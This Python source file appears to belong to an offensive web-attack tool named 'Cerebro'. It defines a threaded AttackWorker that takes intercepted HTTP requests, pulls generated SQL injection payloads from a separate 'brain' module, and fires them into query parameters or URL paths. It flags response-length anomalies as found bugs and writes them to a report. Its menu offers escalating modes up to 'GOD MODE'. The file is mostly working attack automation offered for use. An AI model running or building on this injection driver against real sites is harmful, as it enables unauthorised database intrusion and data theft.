import threading
import requests
import time
import os  # FIXED: IMPORT OS ADDED
import sys
from rich.live import Live
from rich.prompt import Prompt
from core.ui import TacticalHUD
from core.storage import CerebroStorage
from core.brain import CerebroBrain

class AttackWorker(threading.Thread):
    def __init__(self, flow, headers, tech): # FIXED: 3 ARGUMENTS
        super().__init__()
        self.req = flow.request
        self.target = self.req.url
        self.headers = headers
        self.tech = tech
        self.brain = CerebroBrain()
        self.hud = TacticalHUD()
        self.storage = CerebroStorage()
        self.session = requests.Session()
        self.daemon = True

    def run(self):
        while True:
            print("\n")
            self.hud.console.print("[bold red]☣️  CEREBRO SYSTEM PAUSED[/bold red]")
            print("[1] STANDARD [2] EXPERT [3] SINGULARITY (AI) [4] GOD MODE [5] EXIT TO TERMINAL [6] SKIP")
            choice = Prompt.ask("Pilih Tindakan", choices=["1","2","3","4","5","6"], default="4")
            
            if choice == "5": 
                self.hud.console.print("[bold yellow][!] Mematikan Cerebro... Sampai jumpa.[/bold yellow]")
                os._exit(0) # FIXED: WORKS NOW WITH IMPORT OS
            if choice == "6": break
            
            levels = ["STANDARD", "EXPERT", "SINGULARITY"] if choice == "4" else [["STANDARD", "EXPERT", "SINGULARITY"][int(choice)-1]]
            logs = [f"[bold green][*][/bold green] Neural Session Initiated"]

            with Live(self.hud.generate_layout(self.target, str(self.tech), "LOCK", "Scanning", logs), refresh_per_second=4) as live:
                try:
                    base_resp = self.session.get(self.target, headers=self.headers, timeout=10)
                    base_len = len(base_resp.text)
                    
                    targets = dict(self.req.query) if self.req.method == "GET" else {}
                    keys = list(targets.keys()) if targets else ["PATH_INJ"]

                    for lvl in levels:
                        for k in keys:
                            payloads = self.brain.generate_payloads("SQLI", lvl)
                            for p in payloads:
                                live.update(self.hud.generate_layout(self.target, str(self.tech), lvl, f"Testing {k}", logs))
                                
                                # Injection Logic
                                d = targets.copy()
                                if k != "PATH_INJ": d[k] = p
                                url = self.target if k != "PATH_INJ" else self.target + p
                                
                                res = self.session.get(url, params=d, headers=self.headers, timeout=5)
                                if abs(len(res.text) - base_len) > (base_len * 0.05):
                                    logs.append(f"[bold red]!!! BUG FOUND:[/bold red] {p[:20]}")
                                    self.storage.add_vuln(self.target, "Anomaly", p)
                except Exception as e:
                    logs.append(f"[red]Error: {str(e)}[/red]")
            
            self.storage.generate_html_report(self.target)
            self.hud.console.print(f"[bold green][+] Scan Selesai! Report ada di folder /reports.[/bold green]")
            
            cont = Prompt.ask("Kembali ke menu intercept?", choices=["y", "n"], default="y")
            if cont == "n": break